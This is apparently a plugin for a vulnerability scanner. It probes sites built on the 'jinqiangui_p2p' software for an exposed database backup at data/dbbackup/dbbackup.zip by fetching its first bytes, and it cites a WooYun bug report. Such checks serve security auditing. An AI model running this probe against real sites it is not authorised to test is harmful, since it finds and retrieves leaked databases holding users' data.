#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = treeoph
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0135705
import re
def assign(service, arg):
    if service == 'jinqiangui_p2p':
        return True, arg
def audit(arg):
    payload = 'data/dbbackup/dbbackup.zip'
    target = arg + payload
    header='Range:  bytes=0-100'
    code, head, res, errcode, _ = curl.curl2(target,header=header)
    if code==206 and 'dbbackup' in res:
        security_note(target)

        return arg
if __name__== '__main__':
    from dummy import *
